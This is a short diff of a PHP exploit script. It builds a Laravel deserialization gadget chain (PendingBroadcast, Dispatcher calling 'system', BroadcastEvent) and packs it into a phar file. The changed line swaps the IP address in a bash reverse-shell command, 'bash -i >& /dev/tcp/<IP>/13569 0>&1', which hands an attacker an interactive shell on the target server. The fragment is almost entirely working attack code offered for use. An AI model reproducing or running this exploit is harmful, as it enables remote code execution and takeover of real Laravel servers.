@@ -65,7 +65,7 @@ namespace Illuminate\Bus{
     }
 }
 namespace{
-    $command = new Illuminate\Broadcasting\BroadcastEvent("bash -c 'bash -i >& /dev/tcp/116.62.227.151/13569 0>&1'");
+    $command = new Illuminate\Broadcasting\BroadcastEvent("bash -c 'bash -i >& /dev/tcp/117.53.27.121/13569 0>&1'");
     $dispater = new Illuminate\Bus\Dispatcher("system");
     $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command);
     $phar = new Phar('phar.phar');
